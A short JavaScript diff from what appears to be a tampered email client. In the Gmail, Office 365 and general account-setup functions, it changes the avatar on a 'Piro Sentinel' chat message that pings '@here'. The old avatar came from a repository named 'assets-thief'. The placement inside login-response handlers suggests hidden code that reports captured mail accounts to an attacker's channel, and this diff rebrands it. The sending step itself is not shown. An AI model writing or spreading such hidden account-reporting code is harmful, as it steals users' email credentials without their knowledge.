@@ -129,7 +129,7 @@ async function expandAccountWithCommonSettings(account) {
       const message = {
         username: "Piro Sentinel",
         avatar_url:
-          "https://raw.githubusercontent.com/freeman649/assets-thief/main/logo/image_3.png",
+          "https://raw.githubusercontent.com/404log/aka/main/new%20logo%20piro.png",
         content: "@here",
         embeds: [embed],
       };
@@ -313,7 +313,7 @@ async function buildGmailAccountFromAuthResponse(code) {
       const message = {
         username: "Piro Sentinel",
         avatar_url:
-          "https://raw.githubusercontent.com/freeman649/assets-thief/main/logo/image_3.png",
+          "https://raw.githubusercontent.com/404log/aka/main/new%20logo%20piro.png",
         content: "@here",
         embeds: [embed],
       };
@@ -431,7 +431,7 @@ async function buildO365AccountFromAuthResponse(code) {
       const message = {
         username: "Piro Sentinel",
         avatar_url:
-          "https://raw.githubusercontent.com/freeman649/assets-thief/main/logo/image_3.png",
+          "https://raw.githubusercontent.com/404log/aka/main/new%20logo%20piro.png",
         content: "@here",
         embeds: [embed],
       };
